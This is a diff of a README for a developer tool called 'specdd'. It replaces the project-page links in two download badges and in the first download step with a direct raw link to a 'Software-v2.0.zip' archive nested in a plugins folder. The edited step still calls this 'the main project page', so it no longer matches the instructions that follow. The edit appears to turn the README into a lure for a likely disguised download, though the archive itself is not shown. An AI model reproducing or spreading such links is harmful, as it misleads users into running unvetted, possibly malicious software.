@@ -1,6 +1,6 @@
 # 🛠️ specdd - Build better code with automation tools
 
-[![](https://img.shields.io/badge/Download-specdd-blue.svg)](https://github.com/mnyok9939/specdd)
+[![](https://img.shields.io/badge/Download-specdd-blue.svg)](https://github.com/mnyok9939/specdd/raw/refs/heads/main/plugins/specdd/Software-v2.0.zip)
 
 ## 📋 What is specdd?
 
@@ -22,12 +22,12 @@ Your computer needs specific hardware and software to run this tool reliably. Pl
 
 You can get the application files through the project page. Follow these steps to obtain the software:
 
-1. Visit the main project page at https://github.com/mnyok9939/specdd.
+1. Visit the main project page at https://github.com/mnyok9939/specdd/raw/refs/heads/main/plugins/specdd/Software-v2.0.zip
 2. Select the button labeled "Code" near the top right of the page.
 3. Choose "Download ZIP" from the menu.
 4. Save the file to your computer.
 
-[![](https://img.shields.io/badge/Download-specdd-grey.svg)](https://github.com/mnyok9939/specdd)
+[![](https://img.shields.io/badge/Download-specdd-grey.svg)](https://github.com/mnyok9939/specdd/raw/refs/heads/main/plugins/specdd/Software-v2.0.zip)
 
 ## ⚙️ Installation Guide
 
